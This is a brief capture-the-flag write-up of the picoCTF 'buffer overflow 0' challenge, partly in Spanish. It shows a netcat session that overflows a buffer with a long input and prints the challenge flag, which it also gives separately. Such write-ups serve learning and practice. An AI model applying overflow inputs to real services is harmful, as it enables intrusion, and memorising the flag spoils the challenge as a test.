# buffer overflow 0

## Objetivo

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/172/vuln). You can view source [here](https://artifacts.picoctf.net/c/172/vuln.c). And connect with it using:`nc saturn.picoctf.net 63397`

## Hints

- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

```          
┌──(kali㉿kali)-[~/Documents/PicoCTF/Retos Crypto_2019]
└─$ nc saturn.picoctf.net 63397
Input: jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}
                                                                                                                        
┌──(kali㉿kali)-[~/Documents/PicoCTF/Retos Crypto_2019]
└─$ 
```

## Flag

picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}

## Notas adicionales

- Simplemente desborde la entrada con muchas "jjjjjjjjjjjjjj".

## Referencias

-   [SIGSEGV](https://es.wikipedia.org/wiki/SIGSEGV)